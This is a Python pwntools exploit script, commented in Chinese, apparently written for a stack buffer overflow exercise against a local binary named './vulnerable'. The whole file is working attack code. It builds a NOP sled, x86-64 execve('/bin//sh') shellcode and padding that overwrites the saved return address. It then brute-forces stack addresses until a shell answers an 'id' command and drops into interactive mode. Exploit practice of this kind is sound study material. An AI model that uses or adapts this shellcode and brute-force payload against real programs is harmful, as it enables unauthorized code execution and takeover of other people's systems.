# exploit.py
from pwn import *

# 启用调试输出，显示详细信息，便于调试
context.log_level = 'info'
# 指定目标程序的架构为amd64（64位）
context.arch = 'amd64'
context.bits = 64
# 指定使用的终端类型
context.terminal = ['gnome-terminal', '-e']

# 设置目标二进制程序的路径
binary = './vulnerable'

# 尝试利用指定的地址进行攻击
# addr: 猜测的缓冲区地址
# 返回True表示利用成功，False表示失败

def try_exploit(addr):
    try:
        print("try exploit addr: ", hex(addr))  # 打印当前尝试的地址
        # 启动目标程序进程
        p = process(binary)

        # 等待程序输出，直到出现'buffer is: '，然后读取缓冲区地址
        p.recvuntil(b'buffer is: ')
        buffer_addr = int(p.recvline().strip(), 16)
        print(f"[+] Buffer address: {hex(buffer_addr)}")

        # 构造shellcode，这里是一个常见的execve('/bin//sh')的shellcode
        shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
        print(f"[+] Shellcode length: {len(shellcode)} bytes")

        # 构造攻击载荷：
        # 1. NOP滑板，增加shellcode命中概率
        nop_sled = b"\x90" * 64
        # 2. 填充A字符，使payload长度达到覆盖返回地址的位置
        # 128为缓冲区长度，8为SFP/old RBP长度
        padding = b"A" * (128 + 8 - len(nop_sled) - len(shellcode))
        # 3. 返回地址，指向猜测的缓冲区地址+滑板长度
        ret_addr = p64(addr + len(nop_sled))

        # 拼接最终payload：滑板 + shellcode + 填充 + 返回地址
        payload = nop_sled + shellcode + padding + ret_addr

        print(f"[+] Payload length: {len(payload)} bytes")
        print(f"[+] Return address: {hex(addr + len(nop_sled))}")

        # 发送payload到程序
        print("[+] Sending payload...")
        p.recvuntil(b"Please enter your input: ")
        p.sendline(payload)
        p.recv(timeout=5)  # 等待程序处理

        # 尝试执行id命令，判断是否拿到shell
        p.sendline(b"id")
        try:
            response = p.recv(timeout=5)
            # 如果输出中包含uid=，说明已经获得shell
            if b"uid=" in response:
                log.success(f"成功！地址: {hex(addr)}")
                # 进入交互模式，手动操作shell
                p.interactive()
                return True
        except:
            # 如果出错，关闭进程，返回失败
            p.close()
            return False
    except Exception as e:
        # 捕获所有异常，返回失败
        return False

# 主函数，负责遍历所有可能的缓冲区地址，进行爆破

def main():
    # 定义可能的缓冲区起始地址范围（页对齐）
    start_addr = 0x7fffffffe000
    end_addr = 0x7ffffffff000
    
    print("开始暴力破解...")
    
    # 外层循环遍历每一页的基址
    for base in range(start_addr, end_addr, 0x1000):
        log.info(f"尝试基址: {hex(base)}")
        # 内层循环在一页内以16字节为步长遍历
        for offset in range(0, 0x1000, 16):
            addr = base + offset
            # 尝试利用当前地址
            if try_exploit(addr):
                return  # 成功后退出

# 脚本入口
if __name__ == "__main__":
    main()